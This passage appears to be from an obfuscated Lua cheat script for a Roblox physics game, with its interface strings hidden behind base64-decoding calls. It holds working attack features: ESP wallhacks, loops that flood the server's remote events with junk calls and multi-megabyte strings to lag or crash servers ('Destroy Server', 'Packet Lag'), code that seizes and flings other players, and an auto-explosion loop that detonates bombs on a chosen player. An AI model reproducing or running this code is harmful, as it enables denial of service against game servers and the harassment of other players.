                    updateColors()
                end
            end
        })
        
        VisL:CreateToggle({
            Name = loadstring(base64decode("RW5hYmxlIFBsYXllciBFU1A="))(),
            Default = false,
            Callback = function(Value)
                espEnabled = Value
                if Value then
                    updateAllESP()
                    
                    local playerAddedConn = Players.PlayerAdded:Connect(function(plr)
                        task.wait(0.5)
                        if espEnabled and plr ~= LocalPlayer and plr.Character then
                            createESP(plr)
                        end
                    end)
                    table.insert(espConnections, playerAddedConn)
                    
                    local charAddedConn = Players.PlayerAdded:Connect(function(plr)
                        if espEnabled and plr ~= LocalPlayer then
                            local charConn = plr.CharacterAdded:Connect(function()
                                task.wait(0.5)
                                if espEnabled and plr.Character then
                                    local exists = false
                                    for _, obj in ipairs(espObjects) do
                                        if obj.player == plr then
                                            exists = true
                                            break
                                        end
                                    end
                                    if not exists then
                                        createESP(plr)
                                    end
                                end
                            end)
                            table.insert(espConnections, charConn)
                        end
                    end)
                    table.insert(espConnections, charAddedConn)
                else
                    clearESP()
                end
            end
        })
        
        Players.PlayerRemoving:Connect(function(plr)
            for xVec0uwV, obj in ipairs(espObjects) do
                if obj.player == plr then
                    pcall(function()
                        if obj.highlight then obj.highlight:Destroy() end
                        if obj.billboard then obj.billboard:Destroy() end
                        if obj.distBillboard then obj.distBillboard:Destroy() end
                    end)
                    table.remove(espObjects, xVec0uwV)
                    break
                end
            end
        end)
    end

    -- PCLD ESP (Box)
    do
        pcldEnabled = false
        pcldBoxes = {}
        pcldColor = Color3.fromRGB(0, 255, 255)
        pcldRainbow = false
        pcldConnections = {}

        local targetNames = {loadstring(base64decode("cGFydGVzcA=="))(), loadstring(base64decode("cGxheWVyY2hhcmFjdGVybG9jYXRpb25kZXRlY3Rvcg=="))()}

        function IsTarget(obj)
            if not obj:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) then
                return false
            end
            for _, name in ipairs(targetNames) do
                if string.lower(obj.Name) == string.lower(name) then
                    return true
                end
            end
            return false
        end

        function AddBoxESP(obj)
            if pcldBoxes[obj] then
                return
            end
            local box = Instance.new(loadstring(base64decode("Qm94SGFuZGxlQWRvcm5tZW50"))())
            box.Adornee = obj
            box.AlwaysOnTop = true
            box.ZIndex = 5
            box.Color3 = pcldColor
            box.Transparency = 0.3
            box.Size = obj.Size
            box.Parent = game.CoreGui
            pcldBoxes[obj] = box
            
            local conn = obj.AncestryChanged:Connect(function(_, parent)
                if not parent and pcldBoxes[obj] then
                    if pcldBoxes[obj] then
                        pcldBoxes[obj]:Destroy()
                    end
                    pcldBoxes[obj] = nil
                end
            end)
            table.insert(pcldConnections, conn)
        end

        function RemoveAllBoxes()
            for obj, box in pairs(pcldBoxes) do
                if box then
                    box:Destroy()
                end
            end
            pcldBoxes = {}
            for _, conn in ipairs(pcldConnections) do
                pcall(function() conn:Disconnect() end)
            end
            pcldConnections = {}
        end

        function Scan()
            for _, obj in ipairs(workspace:GetDescendants()) do
                if pcldEnabled and IsTarget(obj) then
                    AddBoxESP(obj)
                end
            end
        end

        function UpdatePCLDColors()
            for _, box in pairs(pcldBoxes) do
                pcall(function()
                    box.Color3 = pcldColor
                end)
            end
        end

        VisL:CreateToggle({
            Name = loadstring(base64decode("UmFpbmJvdyBQQ0xE"))(),
            Default = false,
            Callback = function(v)
                pcldRainbow = v
                if v then
                    task.spawn(function()
                        while pcldRainbow do
                            local hue = tick() % 1
                            local color = Color3.fromHSV(hue, 1, 1)
                            for _, box in pairs(pcldBoxes) do
                                pcall(function()
                                    box.Color3 = color
                                end)
                            end
                            task.wait(0.05)
                        end
                    end)
                else
                    pcldColor = Color3.fromRGB(0, 255, 255)
                    UpdatePCLDColors()
                end
            end
        })

        VisL:CreateToggle({
            Name = loadstring(base64decode("RW5hYmxlIFBDTEQ="))(),
            Default = false,
            Callback = function(v)
                pcldEnabled = v
                if pcldEnabled then
                    Scan()
                    local conn = workspace.DescendantAdded:Connect(function(obj)
                        if pcldEnabled and IsTarget(obj) then
                            AddBoxESP(obj)
                        end
                    end)
                    table.insert(pcldConnections, conn)
                else
                    RemoveAllBoxes()
                end
            end
        })
    end
end

local KB_THRESHOLD = 5
local BYTE_THRESHOLD = KB_THRESHOLD * 1024
local COOLDOWN = 30
local lastNotify = 0
local packetConnections = {}
-- Utility Functions using Script 6 UI's notification style
local function packetNotify(title, text)
    pcall(function()
        Library:Notify({
            Title = title or loadstring(base64decode("UGFja2V0IERldGVjdGVk"))(),
            Content = text or loadstring(base64decode(""))(),
            Duration = 7
        })
    end)
end

ServerGroup = Tabs.Server:CreateBlock({Name = loadstring(base64decode("TGFncw=="))(), Side = loadstring(base64decode("TGVmdA=="))()})
KickGroup = Tabs.Server:CreateBlock({Name = loadstring(base64decode("U2VydmVy"))(), Side = loadstring(base64decode("UmlnaHQ="))()})

selectedHeight = loadstring(base64decode("U3Bhd24="))()

function getAllPlayers()
    local players = {}
    for _, plr in pairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer then
            table.insert(players, plr)
        end
    end
    return players
end

GrabEvents = ReplicatedStorage:FindFirstChild(loadstring(base64decode("R3JhYkV2ZW50cw=="))())

function spamOwnership(hrp)
    if not GrabEvents then return end
    local setOwner = GrabEvents:FindFirstChild(loadstring(base64decode("U2V0TmV0d29ya093bmVy"))())
    if setOwner and hrp then pcall(function() setOwner:FireServer(hrp, hrp.CFrame) end) end
end

function teleportToPlayer(myHrp, targetHrp)
    if not myHrp or not targetHrp then return end
    pcall(function()
        myHrp.CFrame = targetHrp.CFrame * CFrame.new(0, 5, 5)
        myHrp.AssemblyLinearVelocity = Vector3.zero
    end)
end

function destroyLineOnPlayer(hrp)
    if not GrabEvents then return end
    local createLine = GrabEvents:FindFirstChild(loadstring(base64decode("Q3JlYXRlR3JhYkxpbmU="))())
    local destroyLine = GrabEvents:FindFirstChild(loadstring(base64decode("RGVzdHJveUdyYWJMaW5l"))())
    if not createLine or not destroyLine then return end
    pcall(function()
        createLine:FireServer(hrp, CFrame.new(0, 1e9, 0))
        task.wait()
        destroyLine:FireServer(hrp)
    end)
end

lineLagThread = nil
lineLagEnabled = false

function startLineLag()
    if lineLagEnabled then return end
    lineLagEnabled = true
    lineLagThread = coroutine.create(function()
        if not GrabEvents then return end
        local createLine = GrabEvents:FindFirstChild(loadstring(base64decode("Q3JlYXRlR3JhYkxpbmU="))())
        if not createLine then return end
        while lineLagEnabled do
            local spawnLocation = Workspace:FindFirstChild(loadstring(base64decode("U3Bhd25Mb2NhdGlvbg=="))()) or Workspace:FindFirstChild(loadstring(base64decode("U3Bhd24="))()) or (LocalPlayer.Character and LocalPlayer.Character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))()))
            if spawnLocation then
                local randomX = math.random(-1e9, 1e9)
                local randomZ = math.random(-1e9, 1e9)
                local directions = {CFrame.new(randomX, 0, randomZ), CFrame.new(-randomX, 0, -randomZ), CFrame.new(randomX, 0, -randomZ), CFrame.new(-randomX, 0, randomZ)}
                for _, pos in pairs(directions) do createLine:FireServer(spawnLocation, pos) end
            end
            task.wait()
        end
    end)
    coroutine.resume(lineLagThread)
end

function stopLineLag()
    lineLagEnabled = false
    if lineLagThread then coroutine.close(lineLagThread); lineLagThread = nil end
end

KickGroup:CreateDropdown({
    Name = loadstring(base64decode("RGVzdHJveSBIZWlnaHQ="))(),
    Flag = loadstring(base64decode("RGVzdHJveUhlaWdodA=="))(),
    Items = {loadstring(base64decode("U3Bhd24="))(), loadstring(base64decode("SGVhdmVu"))()},
    Default = loadstring(base64decode("U3Bhd24="))(),
    Callback = function(Value)
        selectedHeight = Value
    end
})

KickGroup:CreateButton({
    Name = loadstring(base64decode("RGVzdHJveSBTZXJ2ZXI="))(),
    Callback = function()
        task.spawn(function()
            local height = (selectedHeight == loadstring(base64decode("SGVhdmVu"))()) and 1e9 or 35
            startLineLag()
            task.wait(1)

            local players = getAllPlayers()
            if #players == 0 then
                stopLineLag()
                return
            end

            local myChar = LocalPlayer.Character
            local myHrp = myChar and myChar:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
            if not myHrp then stopLineLag(); return end

            local playerData = {}
            for _, plr in ipairs(players) do
                local char = plr.Character
                local hrp = char and char:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                if hrp then table.insert(playerData, {player = plr, hrp = hrp}) end
            end

            for _, data in ipairs(playerData) do
                teleportToPlayer(myHrp, data.hrp)
                task.wait(0.2)
                spamOwnership(data.hrp)
                task.wait()
            end

            local radius = 40
            local angleStep = (math.pi * 2) / #playerData
            for idx, data in ipairs(playerData) do
                local angle = (idx - 1) * angleStep
                local x = math.cos(angle) * radius
                local z = math.sin(angle) * radius

                pcall(function()
                    data.hrp.CFrame = CFrame.new(x, height, z)
                    data.hrp.AssemblyLinearVelocity = Vector3.zero
                end)

                local bp = Instance.new(loadstring(base64decode("Qm9keVBvc2l0aW9u"))())
                bp.MaxForce = Vector3.new(1e9, 1e9, 1e9)
                bp.P = 40000000
                bp.Position = Vector3.new(x, height, z)
                bp.Parent = data.hrp
                task.delay(2, function() pcall(function() bp:Destroy() end) end)
                task.wait()
            end

            for xVec0uwV = 1, 8 do
                for _, data in ipairs(playerData) do destroyLineOnPlayer(data.hrp) end
                task.wait(0.3)
            end
        end)
    end
})

KickGroup:CreateButton({
    Name = loadstring(base64decode("U3RvcCBMYWc="))(),
    Callback = function()
        stopLineLag()
    end
})


do

_G.MonsterLagEnabled = false

ServerGroup:CreateToggle({
    Name = loadstring(base64decode("WE9DVSBMYWc="))(),
    Flag = loadstring(base64decode("TW9uc3RlckxhZ1RvZ2dsZQ=="))(),
    Default = false,
    Callback = function(Value)
        _G.MonsterLagEnabled = Value
        
        if Value then
            task.spawn(function()
                local RepS = game:GetService(loadstring(base64decode("UmVwbGljYXRlZFN0b3JhZ2U="))())
                local WS = game:GetService(loadstring(base64decode("V29ya3NwYWNl"))())
                local LP = game:GetService(loadstring(base64decode("UGxheWVycw=="))()).LocalPlayer
                local GrabEvents = RepS:FindFirstChild(loadstring(base64decode("R3JhYkV2ZW50cw=="))())
                local CreateLine = GrabEvents and GrabEvents:FindFirstChild(loadstring(base64decode("Q3JlYXRlR3JhYkxpbmU="))())

                while _G.MonsterLagEnabled and CreateLine do
                    local spawnLocation = WS:FindFirstChild(loadstring(base64decode("U3Bhd25Mb2NhdGlvbg=="))()) 
                        or WS:FindFirstChild(loadstring(base64decode("U3Bhd24="))()) 
                        or (LP.Character and LP.Character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))()))

                    if spawnLocation then
                        local randomX = math.random(-9e9, 9e9)
                        local randomZ = math.random(-9e9, 9e9)
                        CreateLine:FireServer(spawnLocation, CFrame.new(randomX, 0, randomZ))
                    end
                    task.wait()
                end
            end)
        end
    end
})
end

do
    ReplicatedStorage = game:GetService(loadstring(base64decode("UmVwbGljYXRlZFN0b3JhZ2U="))())
    Workspace = game:GetService(loadstring(base64decode("V29ya3NwYWNl"))())
    CreateLine = ReplicatedStorage.GrabEvents.CreateGrabLine

    lineLagActive = false
    lineLevel = 5
    lineAmount = 500

    local function updateLineAmount()
        lineAmount = 100 + (lineLevel - 1) * 100
    end

    ServerGroup:CreateSlider({
        Name = loadstring(base64decode("TGluZSBMYWcgTGV2ZWwgKDEtMTAp"))(),
        Flag = loadstring(base64decode("TGluZUxhZ0xldmVs"))(),
        Default = 5,
        Min = 1,
        Max = 10,
        Callback = function(v)
            lineLevel = v
            updateLineAmount()
        end
    })

    ServerGroup:CreateToggle({
        Name = loadstring(base64decode("TGluZSBMYWc="))(),
        Flag = loadstring(base64decode("TGluZUxhZw=="))(),
        Default = false,
        Callback = function(v)
            lineLagActive = v
            if v then
                task.spawn(function()
                    while lineLagActive do
                        for xVec0uwV = 1, lineAmount do
                            pcall(function()
                                CreateLine:FireServer(Workspace.SpawnLocation, CFrame.new(0, 9e9, 0))
                            end)
                        end
                        task.wait(1)
                    end
                end)
            end
        end
    })
end

do
    ReplicatedStorage = game:GetService(loadstring(base64decode("UmVwbGljYXRlZFN0b3JhZ2U="))())
    R = ReplicatedStorage

    packetLagActive = false
    packetLagTask = nil
    packetLagStrength = 1
    packetLagSize = 1

    local function getPacketSize()
        -- 1 MB = ~1,000,000 ตัวอักษร
        -- แต่ละ char = 1 byte, emoji = 4 bytes
        -- ใช้ string.rep(loadstring(base64decode("QQ=="))(), ขนาด) ได้ง่ายกว่า
        return packetLagSize * 1000000
    end

    ServerGroup:CreateSlider({
        Name = loadstring(base64decode("UGFja2V0IFNpemUgKE1CKQ=="))(),
        Flag = loadstring(base64decode("UGFja2V0U2l6ZQ=="))(),
        Min = 1,
        Max = 20,
        Default = 1,
        Callback = function(v)
            packetLagSize = v
        end
    })

    ServerGroup:CreateButton({
        Name = loadstring(base64decode("U2VuZCBQYWNrZXQgTGFnIChPbmNlKQ=="))(),
        Callback = function()
            GrabEvents = R:FindFirstChild(loadstring(base64decode("R3JhYkV2ZW50cw=="))())
            ExtendGrabLine = GrabEvents and GrabEvents:FindFirstChild(loadstring(base64decode("RXh0ZW5kR3JhYkxpbmU="))())
            if not ExtendGrabLine then return end
            local size = getPacketSize()
            pcall(function()
                ExtendGrabLine:FireServer(string.rep(loadstring(base64decode("QQ=="))(), size))
            end)
            Library:Notify({
                Title = loadstring(base64decode("UGFja2V0IExhZw=="))(),
                Content = loadstring(base64decode("UGFja2V0IHNlbnQhIFNpemU6IA=="))() .. packetLagSize .. loadstring(base64decode("IE1C"))(),
                Duration = 3
            })
        end
    })

    ServerGroup:CreateToggle({
        Name = loadstring(base64decode("UGFja2V0IExhZyAoTG9vcCk="))(),
        Flag = loadstring(base64decode("UGFja2V0TGFn"))(),
        Default = false,
        Callback = function(Value)
            packetLagActive = Value
            if Value then
                packetLagTask = task.spawn(function()
                    GrabEvents = R:FindFirstChild(loadstring(base64decode("R3JhYkV2ZW50cw=="))())
                    ExtendGrabLine = GrabEvents and GrabEvents:FindFirstChild(loadstring(base64decode("RXh0ZW5kR3JhYkxpbmU="))())
                    if not ExtendGrabLine then
                        packetLagActive = false
                        return
                    end
                    local size = getPacketSize()
                    while packetLagActive do
                        task.wait(0.5)
                        pcall(function()
                            ExtendGrabLine:FireServer(string.rep(loadstring(base64decode("QQ=="))(), size))
                        end)
                    end
                end)
            else
                if packetLagTask then
                    task.cancel(packetLagTask)
                    packetLagTask = nil
                end
            end
        end
    })
end

_G.Brkhs = false
fbexpConn = nil

function fbexp()
    if fbexpConn then fbexpConn:Disconnect() fbexpConn = nil end
    fbexpConn = workspace.ChildAdded:Connect(function(child)
        if _G.Brkhs then
            if fbexpConn then fbexpConn:Disconnect() fbexpConn = nil end
            return
        end
        if child.Name == loadstring(base64decode("UGFydA=="))() and (child.Position - Vector3.new(263.4, -4.79, 466.8)).Magnitude <= 2 then
            _G.Brkhs = true
            Library:Notify({Title = loadstring(base64decode("RG9uZSE="))(), Description = loadstring(base64decode("RGVzdHJveWVkIEhvdXNlcyBCYXJyaWVy"))(), Duration = 3})
            for _, plot in pairs(workspace.Plots:GetChildren()) do
                barrier = plot:FindFirstChild(loadstring(base64decode("QmFycmllcg=="))())
                if barrier then
                    for _, part in pairs(barrier:GetChildren()) do
                        if part:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) and part.CanCollide == true then
                            part.CanCollide = false
                        end
                    end
                end
            end
            if fbexpConn then fbexpConn:Disconnect() fbexpConn = nil end
        end
    end)
end

function breakhouse(mode)
    if not mode then return end
    _G.Brkhs = false
    fbexp()
    startTime = tick()
    repeat
        pcall(function()
            game:GetService(loadstring(base64decode("UmVwbGljYXRlZFN0b3JhZ2U="))()).MenuToys.SpawnToyRemoteFunction:InvokeServer(
                loadstring(base64decode("QmFsbFNub3diYWxs"))(),
                CFrame.new(263.5, -4.5, 486.9),
                Vector3.new(0, 0, 0)
            )
        end)
        wStart = tick()
        repeat task.wait() until not LocalPlayer:FindFirstChild(loadstring(base64decode("Q2FuU3Bhd25Ub3k="))()) or LocalPlayer.CanSpawnToy.Value or tick() - wStart > 2
    until _G.Brkhs or tick() - startTime >= 10
    if fbexpConn then fbexpConn:Disconnect() fbexpConn = nil end
end

BarrierGroup = Tabs.Toy:CreateBlock({Name = loadstring(base64decode("QmFycmllcnM="))(), Side = loadstring(base64decode("TGVmdA=="))()})
SparklerGroup = Tabs.Toy:CreateBlock({Name = loadstring(base64decode("U3BhcmtsZXI="))(), Side = loadstring(base64decode("TGVmdA=="))()})
ExplosionConfigBox = Tabs.Toy:CreateBlock({Name = loadstring(base64decode("U2V0dGluZ3M="))(), Side = loadstring(base64decode("UmlnaHQ="))()})
AutoExplosionBox = Tabs.Toy:CreateBlock({Name = loadstring(base64decode("QXV0byBFeHBsb2Rl"))(), Side = loadstring(base64decode("UmlnaHQ="))()})
ExplosionVisualBox = Tabs.Toy:CreateBlock({Name = loadstring(base64decode("VmlzdWFscw=="))(), Side = loadstring(base64decode("UmlnaHQ="))()})

do

    _expTarget = nil
    _expDropUpdate = false
    AutoExplosionEnabled = false
    ExplosionType = loadstring(base64decode("Qm9tYk1pc3NpbGU="))()
    ExplosionInterval = 0
    PredictMovement = false
    ExplosionAmount = 3
    SpawnSpeed = 0
    SetupSpeed = 0
    ExplosionColorEnabled = false
    ExplosionColor = Color3.fromRGB(255, 0, 0)
    RainbowExplosionEnabled = false
    ExplosionBrightness = 10
    origexplosionpresets = {}
    origbrightnessvals = {}
    origsizevals = {}
    origspeedvals = {}
    origlifetimevals = {}
    origdensityvals = {}
    ParticleSize = 1
    ParticleSpeed = 1
    ParticleLifetime = 1
    ParticleDensity = 1
    ParticleTransparency = 0
    TransparentExplosionEnabled = false
    PulseColorEnabled = false
    PulseColorA = Color3.fromRGB(255, 80, 0)
    PulseColorB = Color3.fromRGB(0, 120, 255)
    PulseSpeed = 5
    StrobeEnabled = false
    StrobeIntensity = 5
    InvertColorEnabled = false
    BlendMode = loadstring(base64decode("RGVmYXVsdA=="))()

    SpawnToyRF = ReplicatedStorage:WaitForChild(loadstring(base64decode("TWVudVRveXM="))()):WaitForChild(loadstring(base64decode("U3Bhd25Ub3lSZW1vdGVGdW5jdGlvbg=="))())
    DeleteToyRE = ReplicatedStorage:WaitForChild(loadstring(base64decode("TWVudVRveXM="))()):WaitForChild(loadstring(base64decode("RGVzdHJveVRveQ=="))())
    BuyToy = ReplicatedStorage:WaitForChild(loadstring(base64decode("TWVudVRveXM="))()):WaitForChild(loadstring(base64decode("QnV5VG95UmVtb3RlRnVuY3Rpb24="))())
    BombEvents = ReplicatedStorage:WaitForChild(loadstring(base64decode("Qm9tYkV2ZW50cw=="))())
    SetNetworkOwner = ReplicatedStorage:WaitForChild(loadstring(base64decode("R3JhYkV2ZW50cw=="))()):WaitForChild(loadstring(base64decode("U2V0TmV0d29ya093bmVy"))())

    HitboxNames = {
        BombMissile = loadstring(base64decode("UGFydEhpdERldGVjdG9y"))(),
        BombDarkMatter = loadstring(base64decode("UGFydEhpdERldGVjdG9y"))(),
        FireworkMissile = loadstring(base64decode("UGFydEhpdERldGVjdG9y"))(),
        BombBalloon = loadstring(base64decode("QmFsbG9vbg=="))(),
        PresentBig = loadstring(base64decode("Qm94"))(),
        PresentSmall = loadstring(base64decode("Qm94"))(),
    }

    SetupParts = {
        BombMissile = loadstring(base64decode("Qm9keQ=="))(),
        BombDarkMatter = loadstring(base64decode("UHlyYW1pZA=="))(),
        FireworkMissile = loadstring(base64decode("SGl0Ym94"))(),
        BombBalloon = loadstring(base64decode("QmFsbG9vbg=="))(),
        PresentBig = loadstring(base64decode("Qm94"))(),
        PresentSmall = loadstring(base64decode("Qm94"))(),
    }

    function InitializeExplosionPresets()
        if ReplicatedStorage:FindFirstChild(loadstring(base64decode("RXhwbG9zaW9uTWFrZXI="))()) and ReplicatedStorage.ExplosionMaker:FindFirstChild(loadstring(base64decode("UGFydGljbGVQcmVzZXRz"))()) then
            for _, particle in ipairs(ReplicatedStorage.ExplosionMaker.ParticlePresets:GetChildren()) do
                if particle:IsA(loadstring(base64decode("UGFydGljbGVFbWl0dGVy"))()) then
                    origexplosionpresets[particle] = particle.Color
                    origbrightnessvals[particle] = particle.Brightness
                    origsizevals[particle] = particle.Size
                    origspeedvals[particle] = particle.Speed
                    origlifetimevals[particle] = particle.Lifetime
                    origdensityvals[particle] = particle.Rate
                end
            end
        end
    end

    function GetParticles()
        if not ReplicatedStorage:FindFirstChild(loadstring(base64decode("RXhwbG9zaW9uTWFrZXI="))()) or not ReplicatedStorage.ExplosionMaker:FindFirstChild(loadstring(base64decode("UGFydGljbGVQcmVzZXRz"))()) then
            return {}
        end
        out = {}
        for _, p in ipairs(ReplicatedStorage.ExplosionMaker.ParticlePresets:GetChildren()) do
            if p:IsA(loadstring(base64decode("UGFydGljbGVFbWl0dGVy"))()) then
                table.insert(out, p)
            end
        end
        return out
    end

    function InvertColor(c)
        return Color3.new(1 - c.R, 1 - c.G, 1 - c.B)
    end

    function ApplyExplosionColor()
    for _, particle in ipairs(GetParticles()) do
        local col
        if RainbowExplosionEnabled then
            col = ColorSequence.new({
                ColorSequenceKeypoint.new(0, Color3.new(1, 0, 0)),
                ColorSequenceKeypoint.new(0.25, Color3.new(0, 1, 0)),
                ColorSequenceKeypoint.new(0.5, Color3.new(0, 0, 1)),
                ColorSequenceKeypoint.new(0.75, Color3.new(1, 1, 0)),
                ColorSequenceKeypoint.new(1, Color3.new(1, 0, 0)),
            })
        elseif ExplosionColorEnabled then
            local c = InvertColorEnabled and InvertColor(ExplosionColor) or ExplosionColor
            col = ColorSequence.new(c)
        else
            col = origexplosionpresets[particle]
        end
        particle.Color = col
    end
end

    function ApplyExplosionBrightness()
        for _, particle in ipairs(GetParticles()) do
            if ExplosionBrightness == 10 then
                particle.Brightness = origbrightnessvals[particle]
            else
                particle.Brightness = origbrightnessvals[particle] * 2 * (ExplosionBrightness - 9)
            end
        end
    end

    function ApplyParticleSize()
        for _, particle in ipairs(GetParticles()) do
            orig = origsizevals[particle]
            if orig then
                kps = orig.Keypoints
                newkps = {}
                for _, kp in ipairs(kps) do
                    table.insert(newkps, NumberSequenceKeypoint.new(kp.Time, kp.Value * ParticleSize, kp.Envelope))
                end
                particle.Size = NumberSequence.new(newkps)
            end
        end
    end

    function ApplyParticleSpeed()
    for _, particle in ipairs(GetParticles()) do
        orig = origspeedvals[particle]
        if orig then
            particle.Speed = NumberRange.new(orig.Min * ParticleSpeed, orig.Max * ParticleSpeed)
        end
    end
end

    function ApplyParticleLifetime()
        for _, particle in ipairs(GetParticles()) do
            orig = origlifetimevals[particle]
            if orig then
                particle.Lifetime = NumberRange.new(orig.Min * ParticleLifetime, orig.Max * ParticleLifetime)
            end
        end
    end

    function ApplyParticleDensity()
        for _, particle in ipairs(GetParticles()) do
            orig = origdensityvals[particle]
            if orig then
                particle.Rate = orig * ParticleDensity
            end
        end
    end

    function ApplyParticleTransparency()
        for _, particle in ipairs(GetParticles()) do
            if TransparentExplosionEnabled then
                particle.Transparency = NumberSequence.new({
                    NumberSequenceKeypoint.new(0, ParticleTransparency),
                    NumberSequenceKeypoint.new(1, 1),
                })
            else
                particle.Transparency = NumberSequence.new({
                    NumberSequenceKeypoint.new(0, 0),
                    NumberSequenceKeypoint.new(1, 1),
                })
            end
        end
    end

    function ApplyBlendMode()
        for _, particle in ipairs(GetParticles()) do
            pcall(function()
                particle.LightEmission = (BlendMode == loadstring(base64decode("QWRkaXRpdmU="))()) and 1 or 0
            end)
        end
    end


    function GetSpawnedToys()
        return Workspace:FindFirstChild(LocalPlayer.Name .. loadstring(base64decode("U3Bhd25lZEluVG95cw=="))())
    end

    function ExpGetPlayerList()
        list = {}
        for _, p in pairs(Players:GetPlayers()) do
            if p ~= LocalPlayer then
                table.insert(list, p.DisplayName .. loadstring(base64decode("IChAIA=="))() .. p.Name .. loadstring(base64decode("KQ=="))())
            end
        end
        table.sort(list)
        return list
    end

    -- บรรทัด 9198
local function ExpGetPlayerByName(username)
    if typeof(username) == loadstring(base64decode("SW5zdGFuY2U="))() then
        return username
    end
    return Players:FindFirstChild(username)
end

    function ExpGetTargetHRP()
        if not _expTarget then return nil, nil end
        p = ExpGetPlayerByName(_expTarget)
        if p and p.Character and p.Character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))()) then
            return p.Character.HumanoidRootPart, p
        end
        return nil, nil
    end

    function ExpRefreshDropdown()
        _expDropUpdate = true
        pcall(function()
            ExplosionPlayerDropdown:SetItems(ExpGetPlayerList())
        end)
        _expDropUpdate = false
    end

    function GetPlayerCharacterLocal()
        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))()) then
            return LocalPlayer.Character
        end
        return nil
    end

    function LookAt(from, to)
        dir = (to - from).Unit
        right = dir:Cross(Vector3.new(0, 1, 0))
        up = right:Cross(dir)
        return CFrame.fromMatrix(from, right, up)
    end

    function SetNetworkOwnership(part)
        if not part then return end
        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))()) then
            pcall(function()
                SetNetworkOwner:FireServer(part, LookAt(LocalPlayer.Character.HumanoidRootPart.Position, part.Position))
            end)
        end
    end

    function SpawNoneBomb()
        char = GetPlayerCharacterLocal()
        if char then
            pos = char.HumanoidRootPart.Position
            pcall(function()
                SpawnToyRF:InvokeServer(ExplosionType, CFrame.new(pos + Vector3.new(0, 5, 0)), Vector3.new(0, 0, 0))
                BuyToy:InvokeServer(ExplosionType)
            end)
        end
    end

    function GetAllBombs()
    toys = GetSpawnedToys()
    if not toys then return {} end
    bombs = {}
    for _, toy in pairs(toys:GetChildren()) do
        if toy.Name == ExplosionType then
            table.insert(bombs, toy)
        end
    end
    return bombs
end

    function SetupBomb(bomb)
        if not bomb or not bomb.PrimaryPart then return end
        hitPart = bomb:FindFirstChild(SetupParts[bomb.Name])
        if not hitPart then return end
        SetNetworkOwnership(hitPart)
        task.wait(0.05)
        pcall(function()
            for _, v in pairs(bomb.PrimaryPart:GetChildren()) do
                if v:IsA(loadstring(base64decode("Qm9keVZlbG9jaXR5"))()) or v.Name == loadstring(base64decode("U3RhYmxl"))() then
                    v:Destroy()
                end
            end
            bodyVel = Instance.new(loadstring(base64decode("Qm9keVZlbG9jaXR5"))())
            bodyVel.Velocity = Vector3.new(0, 0, 0)
            bodyVel.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
            bodyVel.Name = loadstring(base64decode("U3RhYmxl"))()
            bodyVel.Parent = bomb.PrimaryPart
            bomb:PivotTo(CFrame.new(math.random(-500, 500), 10000, math.random(-500, 500)))
        end)
    end

    function ExplodeBomb(bomb, targetHRP)
        if not bomb or not targetHRP then return end
        hitbox = bomb:FindFirstChild(HitboxNames[bomb.Name])
        if hitbox then
            targetPos = targetHRP.Position
            if PredictMovement then
                targetPos = targetPos + targetHRP.Velocity / 1.93
            end
            pcall(function()
                BombEvents.BombExplode:FireServer({
                    Hitbox = hitbox,
                    PositionPart = targetHRP,
                }, targetPos)
            end)
        end
    end

    function DeleteAllBombs()
        for _, bomb in pairs(GetAllBombs()) do
            pcall(function()
                DeleteToyRE:FireServer(bomb)
            end)
        end
    end

function SpawNoneBomb()
    local char = GetPlayerCharacterLocal()
    if char then
        local pos = char.HumanoidRootPart.Position
        pcall(function()
            SpawnToyRF:InvokeServer(ExplosionType, CFrame.new(pos + Vector3.new(0, 5, 0)), Vector3.new(0, 0, 0))
            BuyToy:InvokeServer(ExplosionType)
        end)
    end
end

function AutoExplosionLoop()
    local lastLoopTime = 0
    local MAX_ITERATIONS = 100  -- ป้องกัน loop เกิน
    
    while AutoExplosionEnabled do
        -- ป้องกัน loop ทำงานเร็วเกินไป
        if tick() - lastLoopTime < 0.05 then
            task.wait(0.05)
            continue
        end
        lastLoopTime = tick()
        
        local targetHRP, targetPlayer = ExpGetTargetHRP()

        if not targetPlayer or not targetHRP then
            -- ถ้าไม่มี target ให้รอแล้ววนใหม่
            task.wait(0.5)
            continue
        end

        -- ตรวจสอบว่า target ยังมีชีวิตอยู่
        local hum = targetPlayer.Character and targetPlayer.Character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWQ="))())
        if not hum or hum.Health <= 0 then
            task.wait(0.5)
            continue
        end

        -- ลบระเบิดเก่า
        DeleteAllBombs()
        task.wait(0.1)

        -- spawn ระเบิด
        local spawnCount = 0
        local maxSpawnAttempts = 20
        while #GetAllBombs() < ExplosionAmount and AutoExplosionEnabled and spawnCount < maxSpawnAttempts do
            SpawNoneBomb()
            spawnCount = spawnCount + 1
            task.wait(SpawnSpeed + 0.05)
        end

        task.wait(0.15)

        -- setup ระเบิด
        local bombs = GetAllBombs()
        for _, bomb in pairs(bombs) do
            if not AutoExplosionEnabled then break end
            SetupBomb(bomb)
            task.wait(SetupSpeed or 0.05)
        end

        task.wait(0.2)

        -- ระเบิด
        local targetHRP2, targetPlayer2 = ExpGetTargetHRP()
        if targetHRP2 and targetPlayer2 then
            local bombs2 = GetAllBombs()
            for _, bomb in pairs(bombs2) do
                if not AutoExplosionEnabled then break end
                ExplodeBomb(bomb, targetHRP2)
                task.wait(0.01)
            end
        end

        task.wait(0.15)
        DeleteAllBombs()
        task.wait(ExplosionInterval or 0.5)
    end
end

    InitializeExplosionPresets()

    function getPlayerList()
        list = {}
        for _, p in pairs(Players:GetPlayers()) do
            if p ~= LocalPlayer then
                table.insert(list, p.DisplayName .. loadstring(base64decode("IChAIA=="))() .. p.Name .. loadstring(base64decode("KQ=="))())
            end
        end
        return list
    end

    function getPlayerFromSelection(Value)
        if not Value then return nil end
